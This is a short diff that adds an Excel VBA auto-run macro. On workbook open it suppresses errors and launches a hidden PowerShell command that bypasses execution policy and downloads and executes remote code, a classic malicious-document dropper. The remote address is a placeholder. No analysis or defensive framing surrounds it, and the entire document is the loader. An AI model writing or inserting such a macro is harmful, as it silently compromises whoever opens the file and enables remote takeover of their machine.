@@ -1,0 +1,10 @@
+Private Sub Workbook_Open()
+    On Error Resume Next
+    Application.EnableEvents = False
+    
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    
+    ' Simple one-liner that downloads and executes
+    wsh.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex(iwr 'url')""", 0, False
+End Sub
